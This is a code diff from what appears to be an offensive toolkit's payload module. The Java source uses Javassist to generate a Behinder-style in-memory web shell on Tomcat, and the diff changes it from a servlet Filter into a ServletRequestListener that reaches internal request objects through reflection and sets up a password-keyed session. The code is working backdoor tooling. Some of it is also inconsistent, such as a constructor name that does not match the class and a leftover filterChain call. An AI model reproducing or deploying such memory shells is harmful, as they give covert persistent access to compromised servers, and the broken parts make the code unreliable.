@@ -1,12 +1,17 @@
 package cn.safe6.payload.memshell;
 
 import javassist.*;
+import org.apache.catalina.connector.RequestFacade;
 import org.apache.coyote.RequestInfo;
-import javax.servlet.jsp.PageContext;
+import org.apache.catalina.connector.Request;
+import org.apache.catalina.connector.RequestFacade;
+import org.apache.catalina.connector.Response;
 
 import javax.servlet.Filter;
+import javax.servlet.ServletRequestListener;
+import javax.servlet.jsp.PageContext;
 
-public class Behinder {
+public class Behinder1 {
 
 
     /**
@@ -21,27 +26,30 @@ public class Behinder {
         //String pass = "rebeyond";
 
         ClassPool classPool = ClassPool.getDefault();
-        classPool.insertClassPath(new ClassClassPath(Filter.class));
+        classPool.insertClassPath(new ClassClassPath(ServletRequestListener.class));
+        classPool.insertClassPath(new ClassClassPath(org.apache.catalina.connector.RequestFacade.class));
+        classPool.insertClassPath(new ClassClassPath(org.apache.catalina.connector.Request.class));
+        classPool.insertClassPath(new ClassClassPath(org.apache.catalina.connector.Response.class));
         classPool.insertClassPath(new ClassClassPath(RequestInfo.class));
-        classPool.insertClassPath(new ClassClassPath(javax.servlet.jsp.PageContext.class));
-        classPool.insertClassPath(new ClassClassPath(Behinder.class));
+        classPool.insertClassPath(new ClassClassPath(PageContext.class));
+        classPool.insertClassPath(new ClassClassPath(Behinder1.class));
 
 
-        CtClass ctClass = classPool.makeClass("MemBehinder3");
+
+        CtClass ctClass = classPool.makeClass("MemBehinder3Listener1");
         if (ctClass.getDeclaredConstructors().length != 0) {
             ctClass.removeConstructor(ctClass.getDeclaredConstructors()[0]);
         }
-        ctClass.setSuperclass(classPool.getCtClass(Filter.class.getName()));
+        //ctClass.setSuperclass(classPool.getCtClass(ServletRequestListener.class.getName()));
+        ctClass.setInterfaces(new CtClass[]{classPool.getCtClass(ServletRequestListener.class.getName())});
         ctClass.addField(CtField.make("public javax.servlet.jsp.PageContext pageContext;",ctClass));
         ctClass.addField(CtField.make("public String passwd = \"" + pass + "\";", ctClass));
 
 
-        ctClass.addConstructor(CtNewConstructor.make("    public MemBehinder3(javax.servlet.jsp.PageContext pageContext){\n" +
+        ctClass.addConstructor(CtNewConstructor.make("    public MemBehinder3Listener(javax.servlet.jsp.PageContext pageContext){\n" +
                 "        this.pageContext = pageContext;\n" +
                 "    }", ctClass));
 
-        ctClass.addMethod(CtMethod.make("public void init(javax.servlet.FilterConfig filterConfig) throws javax.servlet.ServletException {\n" +
-                "    }", ctClass));
 
         ctClass.addMethod(CtMethod.make("    public static String md5(String s) {\n" +
                 "        String ret = null;\n" +
@@ -54,16 +62,19 @@ public class Behinder {
                 "        return ret.substring(0,16).toLowerCase();\n" +
                 "    }", ctClass));
 
-        ctClass.addMethod(CtMethod.make("    public void doFilter(javax.servlet.ServletRequest servletRequest, javax.servlet.ServletResponse servletResponse, javax.servlet.FilterChain filterChain) throws java.io.IOException, javax.servlet.ServletException {\n" +
+        ctClass.addMethod(CtMethod.make("    public void requestInitialized(javax.servlet.ServletRequestEvent servletRequestEvent){\n" +
                 "\n" +
-                "        javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest) servletRequest;\n" +
-                "        javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse) servletResponse;\n" +
+                "        org.apache.catalina.connector.RequestFacade requestfacade= (org.apache.catalina.connector.RequestFacade.RequestFacade) servletRequestEvent.getServletRequest();\n"+
+                "       java.lang.reflect.Field field = requestfacade.getClass().getDeclaredField(\"request\");" +
+                "       field.setAccessible(true);\n"+
+                "        org.apache.catalina.connector.Request request1 = (javax.servlet.http.HttpServletRequest) field.get(requestfacade);\n" +
+                "        javax.servlet.http.HttpServletRequest request = request1.getRequest();\n" +
+                "        javax.servlet.http.HttpServletResponse response =request.getResponse();\n" +
                 "        javax.servlet.http.HttpSession session = request.getSession();\n" +
                 "\n" +
                 "            response.setHeader(\"inject\", \"ok\");\n" +
                 "        if (request.getParameter(\"test\").equals(\"ok\")) {\n" +
                 "            String k = md5(passwd);\n" +
-                "System.out.println(\"收到----\");"+
                 "            session.putValue(\"u\", k);\n" +
                 "            // 回显密钥\n" +
                 "            try{\n" +
@@ -85,7 +96,7 @@ public class Behinder {
                 "        filterChain.doFilter(request, response);\n" +
                 "    }", ctClass));
 
-        ctClass.addMethod(CtMethod.make("    public void destroy() {\n" +
+        ctClass.addMethod(CtMethod.make("    public void requestDestroyed(javax.servlet.ServletRequestEvent servletRequestEvent) {\n" +
                 "    }", ctClass));
 
         ctClass.addMethod(CtMethod.make("    public static void dynamicAddFilter(javax.servlet.Filter filter, String name, String url, javax.servlet.http.HttpServletRequest request) throws IllegalAccessException {\n" +
